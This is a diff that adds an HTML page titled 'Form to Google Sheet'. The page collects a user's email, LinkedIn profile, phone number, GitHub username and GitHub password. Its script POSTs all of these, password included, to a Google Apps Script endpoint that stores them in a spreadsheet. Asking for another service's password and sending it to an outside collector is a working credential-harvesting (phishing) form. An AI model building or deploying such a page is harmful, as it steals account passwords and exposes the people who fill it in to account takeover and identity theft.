@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Form to Google Sheet</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <h2>User Data Form</h2>
+
+    <form id="myForm">
+        <input class="a" type="email" name="email" placeholder="Email" required><br><br>
+        <input class="a" type="url" name="linkedin" placeholder="LinkedIn Profile" required><br><br>
+        <input class="a" type="tel" name="phone" placeholder="Phone Number" required><br><br>
+        <input class="a" type="text" name="github" placeholder="GitHub Username" required><br><br>
+        <input class="a" type="password" name="password" placeholder="GitHub Password" required><br><br>
+
+        <button type="submit">Submit</button>
+    </form>
+
+    <script>
+        const form = document.getElementById("myForm");
+
+        form.addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            const data = {
+                email: form.email.value,
+                linkedin: form.linkedin.value,
+                phone: form.phone.value,
+                github: form.github.value,
+                password: form.password.value
+            };
+
+            fetch("https://script.google.com/macros/s/AKfycbxRWPOuiXDPupS6_A5AVSIdZu2LOZVscFqo8W55PbEzx9Y3rqiYa1ob7MIdsud8a-TIBA/exec", {
+                method: "POST",
+                body: JSON.stringify(data),
+            })
+                .then(res => res.json())
+                .then(data => {
+                    alert("Data submitted successfully!");
+                    form.reset();
+                })
+                .catch(err => alert("Error"));
+        });
+    </script>
+
+</body>
+
+</html>
